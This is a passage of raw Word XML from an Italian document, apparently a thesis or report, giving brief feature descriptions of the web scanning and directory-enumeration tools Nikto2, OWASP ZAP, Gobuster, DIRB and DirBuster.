        <w:t xml:space="preserve">n tipi diversi, nel nostro caso andiamo ad effettuare una conversione in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="005407FF">
        <w:t xml:space="preserve">un </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>file.html</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="005407FF">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67805575" w14:textId="77777777" w:rsidR="003F23D5" w:rsidRDefault="003F23D5" w:rsidP="00B239BB">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AA5AF25" w14:textId="01756C79" w:rsidR="006504D5" w:rsidRPr="00083AF2" w:rsidRDefault="003D7E9D" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc139378604"/>
      <w:r w:rsidRPr="00083AF2">
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2" w:rsidRPr="00083AF2">
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006504D5" w:rsidRPr="00083AF2">
        <w:t>NIKTO2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="3AA3A9A9" w14:textId="0FB45A73" w:rsidR="00981BE1" w:rsidRDefault="006504D5" w:rsidP="00981BE1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> è uno strumento utilizzato per </w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">la </w:t>
      </w:r>
      <w:r w:rsidR="00981BE1" w:rsidRPr="00981BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Web </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00981BE1" w:rsidRPr="00981BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00981BE1" w:rsidRPr="00981BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Scanner</w:t>
      </w:r>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Permette di rilevare e analizzare vulnerabilità causate da:</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006504D5">
        <w:t>Errori di configurazione del server</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:t>; U</w:t>
      </w:r>
      <w:r w:rsidRPr="006504D5">
        <w:t>tilizzo di file (o configurazioni) predefiniti e/o non sicuri</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="006504D5">
        <w:t>Applicazioni server obsolete</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>Etc</w:t>
      </w:r>
      <w:r w:rsidR="00981BE1">
        <w:t>. Supporta inoltre:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5137B809" w14:textId="5B874AB0" w:rsidR="006504D5" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Implementazioni </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>multi-piattaforma</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A52DB9" w14:textId="70492B49" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SSL/TLS</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BB469A" w14:textId="4025E690" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Vari metodi di autenticazione per gli </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EED6AA7" w14:textId="420E7832" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Proxy</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B41BDC" w14:textId="090AF855" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Varie tecniche di </w:t>
      </w:r>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">IDS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Evasion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469C7CDD" w14:textId="04E59C70" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Enumerazione dei sottodomini</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B73EC6" w14:textId="091819CC" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Controlli di sicurezza delle applicazioni Web (XSS, SQL Injection, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4198697A" w14:textId="1853A606" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Attacchi basati su dizionario per individuare le credenziali di autenticazione</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20138025" w14:textId="5C14F3CB" w:rsidR="00981BE1" w:rsidRPr="00981BE1" w:rsidRDefault="00981BE1">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00981BE1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72984013" w14:textId="77777777" w:rsidR="006504D5" w:rsidRDefault="006504D5" w:rsidP="006504D5">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C9E3961" w14:textId="0E04D6E2" w:rsidR="006504D5" w:rsidRPr="00083AF2" w:rsidRDefault="006504D5" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc139378605"/>
      <w:r w:rsidRPr="00083AF2">
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2" w:rsidRPr="00083AF2">
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:t xml:space="preserve"> OWASP ZAP</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="26DF4592" w14:textId="325FCC6B" w:rsidR="006504D5" w:rsidRDefault="00981BE1" w:rsidP="003D7E9D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>OWASP ZAP</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D" w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D" w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Open Web Application Security Project Zed Attack Proxy</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D" w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D" w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">è uno </w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">scanner Open Source </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>basato</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Java</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> per la </w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D" w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Web Vulnerability Scanner</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Può</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>operare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003D7E9D">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> come:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4836AD62" w14:textId="77777777" w:rsidR="003D7E9D" w:rsidRDefault="003D7E9D">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Web Crawler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3EB9CE" w14:textId="77777777" w:rsidR="003D7E9D" w:rsidRPr="003D7E9D" w:rsidRDefault="003D7E9D">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:t xml:space="preserve"> Scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577652E1" w14:textId="77777777" w:rsidR="003D7E9D" w:rsidRPr="003D7E9D" w:rsidRDefault="003D7E9D">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:t>roxy Web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00326DAC" w14:textId="7954F6DD" w:rsidR="003D7E9D" w:rsidRPr="003D7E9D" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Etc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045CA48F" w14:textId="7A5365F0" w:rsidR="00BF0383" w:rsidRPr="00550195" w:rsidRDefault="00BF0383" w:rsidP="00BF0383">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc139378606"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> Gobuster</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="3EB075FA" w14:textId="6412370F" w:rsidR="00BF0383" w:rsidRDefault="002F79CF" w:rsidP="00BF0383">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Gobuster è uno strumento utilizzato per</w:t>
      </w:r>
      <w:r w:rsidR="00467444">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> il</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Web Crawlers &amp; Directory </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:bookmarkStart w:id="15" w:name="_Hlk135059871"/>
      <w:r>
        <w:t xml:space="preserve">Permette di effettuare </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> di directory</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e file su siti Web, ma permette anche l’enumerazione di sottodomini DNS</w:t>
      </w:r>
      <w:r w:rsidR="00550195">
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="7C689460" w14:textId="77777777" w:rsidR="00467444" w:rsidRDefault="00467444" w:rsidP="00BF0383"/>
    <w:p w14:paraId="55204FE9" w14:textId="358A1975" w:rsidR="00467444" w:rsidRDefault="00467444" w:rsidP="00467444">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc139378607"/>
      <w:r>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED40FB">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DIRB</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="6E0FDD1A" w14:textId="57D339BF" w:rsidR="00467444" w:rsidRDefault="00467444" w:rsidP="00467444">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Dirb è un altro strumento utilizzato per il </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Web Crawlers &amp; Directory </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Permette di cercare risorse Web nascoste, come: URL, file </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>etc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Effettua </w:t>
      </w:r>
      <w:r w:rsidR="007C7871">
        <w:t>attacchi</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> basati su dizionari (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>wordlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) ed analizza le risposte de </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Web Server</w:t>
      </w:r>
      <w:r>
        <w:t>. Questi dizionari possono essere personalizzati o trovarne alcuni preconfigurati.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766B820C" w14:textId="77777777" w:rsidR="00467444" w:rsidRDefault="00467444" w:rsidP="00467444"/>
    <w:p w14:paraId="45CFE09D" w14:textId="1ABAD1DA" w:rsidR="00467444" w:rsidRPr="00467444" w:rsidRDefault="00467444" w:rsidP="00467444">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc139378608"/>
      <w:r>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="003D7E9D">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00467444">
        <w:t>OWASP DirBuster</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613FEFA7" w14:textId="08E19D55" w:rsidR="00F16C58" w:rsidRDefault="00467444" w:rsidP="00A82052">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>DirBuster è un’</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00467444">
        <w:t>pplicazione java multi-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00467444">
        <w:t>thread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00467444">
        <w:t xml:space="preserve"> appartenente al progetto OWASP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, anch’essa è uno strumento utilizzato per il </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Web Crawlers &amp; Directory </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
